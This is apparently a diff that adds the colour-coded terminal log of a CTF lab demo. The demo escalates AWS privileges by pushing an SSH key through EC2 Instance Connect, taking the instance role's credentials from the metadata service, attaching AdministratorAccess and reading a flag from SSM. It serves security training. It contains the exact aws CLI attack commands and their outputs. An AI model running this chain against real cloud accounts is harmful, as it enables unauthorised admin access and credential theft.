@@ -1,0 +1,155 @@
+[0;32m========================================[0m
+[0;32mEC2 Instance Connect Privilege Escalation Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-ec2-003-to-admin-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Region: us-east-1
+Target Instance: i-07fe9161ab160a296
+Target Role: pl-prod-ec2-003-to-admin-ec2-admin-role
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+  Denied helpful permissions on user: pl-prod-ec2-003-to-admin-starting-user
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Configuring AWS CLI with starting user credentials[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-ec2-003-to-admin-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying we don't have admin permissions yet[0m
+Attempting to list IAM users (should fail)...
+[2m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed: Cannot list IAM users (as expected)[0m
+
+[1;33mStep 5: Discovering target EC2 instance[0m
+Getting instance details...
+[2m[ReadOnly] $ aws ec2 describe-instances --region us-east-1 --instance-ids i-07fe9161ab160a296 --query 'Reservations[0].Instances[0].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn,Platform]' --output text[0m
+Instance ID: i-07fe9161ab160a296
+State: running
+Public IP: 44.201.25.118
+Instance Profile: arn:aws:iam::123456789012:instance-profile/pl-prod-ec2-003-to-admin-instance-profile
+Platform: None
+[0;32m✓ Found target instance with privileged role[0m
+
+[1;33mStep 6: Generating temporary SSH key pair[0m
+Creating RSA key pair for EC2 Instance Connect...
+Generated SSH public key
+[0;32m✓ SSH key pair created at: /tmp/pathfinding_eic_key[0m
+
+[1;33mStep 7: Pushing SSH public key to instance (privilege escalation vector)[0m
+Using ec2-instance-connect:SendSSHPublicKey to push temporary key...
+
+[0;34mThis is where the privilege escalation happens:[0m
+We can push our SSH public key to the instance for 60 seconds!
+
+[0;36m[Attacker] $ aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id i-07fe9161ab160a296 --instance-os-user ec2-user --ssh-public-key file:///tmp/pathfinding_eic_key.pub[0m
+{
+    "RequestId": "c76403ec-cfb8-4365-8ffd-350a97e8a2f8",
+    "Success": true
+}
+
+[0;32m✓ Successfully pushed SSH public key to instance![0m
+[0;31m⚠ WARNING: The public key is only valid for 60 seconds![0m
+
+[1;33mStep 8: SSH into the instance and extract credentials (automated)[0m
+
+[0;31m⏰ IMPORTANT: We have 60 seconds to SSH and extract credentials![0m
+
+Executing SSH command to extract credentials from IMDS...
+[0;32m✓ Successfully extracted credentials via SSH[0m
+
+[1;33mStep 9: Parsing and configuring extracted credentials[0m
+Extracted Access Key ID: ASIA2E4JP2...
+Switching to extracted credentials...
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+New identity: arn:aws:sts::123456789012:assumed-role/pl-prod-ec2-003-to-admin-ec2-admin-role/i-07fe9161ab160a296
+[0;32m✓ Now using extracted EC2 admin role credentials[0m
+
+[1;33mStep 10: Using admin credentials to make starting user an admin[0m
+Attaching AdministratorAccess policy to starting user: pl-prod-ec2-003-to-admin-starting-user
+
+[0;32m✓ Successfully attached AdministratorAccess policy to starting user![0m
+
+Waiting 15 seconds for IAM policy to propagate...
+
+[1;33mStep 11: Switching back to starting user and verifying admin access[0m
+Switching from extracted credentials back to starting user...
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Back to starting user: arn:aws:iam::123456789012:user/pl-prod-ec2-003-to-admin-starting-user
+
+Testing admin access as starting user...
+[2m[Attacker] $ aws iam list-users --max-items 3 --output table[0m
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+|                                                                                    ListUsers                                                                                   |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+|  NextToken                 |  eyJNYXJrZXIiOiBudWxsLCAiYm90b190cnVuY2F0ZV9hbW91bnQiOiAzfQ==                                                                                     |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+||                                                                                     Users                                                                                    ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||                             Arn                             |      CreateDate       |   PasswordLastUsed    | Path  |        UserId          |           UserName            ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582225 |  2026-03-03T23:57:05Z |                       |  /    |  AIDA2E4JP2KMDN764OVDX |  pathrunner-admin-1772582225  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582487 |  2026-03-04T00:01:27Z |                       |  /    |  AIDA2E4JP2KMIGZOBA63O |  pathrunner-admin-1772582487  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582552 |  2026-03-04T00:02:32Z |  2026-03-04T00:04:42Z |  /    |  AIDA2E4JP2KMGNBJR4AJO |  pathrunner-admin-1772582552  ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+[0;32m✓ Successfully listed IAM users![0m
+[0;32m✓ STARTING USER NOW HAS ADMIN ACCESS![0m
+
+[1;33mStep 12: Capturing CTF flag from SSM Parameter Store[0m
+
+[0;36m[Attacker (now admin)] $ aws ssm get-parameter --name /pathfinding-labs/flags/ec2-003-to-admin --query 'Parameter.Value' --output text[0m
+[0;32m✓ Flag captured: flag{ec2_003_admin_captured}[0m
+
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-ec2-003-to-admin-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
+
+[0;32m========================================[0m
+[0;32m✅ CTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+1. Started as: pl-prod-ec2-003-to-admin-starting-user (with ec2-instance-connect:SendSSHPublicKey permission)
+2. Pushed temporary SSH public key to EC2 instance: i-07fe9161ab160a296
+3. SSH'd into the instance within 60-second window
+4. Extracted instance role credentials from IMDS (metadata service)
+5. Used credentials from: pl-prod-ec2-003-to-admin-ec2-admin-role
+6. Achieved: Administrator Access
+7. Captured CTF flag from SSM Parameter Store: flag{ec2_003_admin_captured}
+
+[1;33mAttack Path:[0m
+  pl-prod-ec2-003-to-admin-starting-user → (ec2-instance-connect:SendSSHPublicKey) → SSH to EC2
+  → (Extract from IMDS) → pl-prod-ec2-003-to-admin-ec2-admin-role → Admin
+  → (ssm:GetParameter) → CTF Flag
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id i-07fe9161ab160a296 --instance-os-user ec2-user --ssh-public-key file:///tmp/pathfinding_eic_key.pub[0m
+  [0;36m$ aws ssm get-parameter --name /pathfinding-labs/flags/ec2-003-to-admin --query 'Parameter.Value' --output text[0m
+
+[1;33mAttack Artifacts:[0m
+- SSH key pair: /tmp/pathfinding_eic_key (temporary)
+- Accessed instance: i-07fe9161ab160a296
+- Extracted role: pl-prod-ec2-003-to-admin-ec2-admin-role
+
+[0;34mMITRE ATT&CK Techniques:[0m
+- T1078.004: Valid Accounts: Cloud Accounts (EC2 Instance Connect)
+- T1552.005: Unsecured Credentials: Cloud Instance Metadata API
+
+[0;31m⚠ Security Impact:[0m
+Any principal with ec2-instance-connect:SendSSHPublicKey on an instance
+can SSH into that instance and extract the instance role's credentials.
+If the instance has a privileged role, this results in privilege escalation.
+
+[1;33mTo clean up:[0m
+  ./cleanup_attack.sh or use the plabs TUI/CLI
+
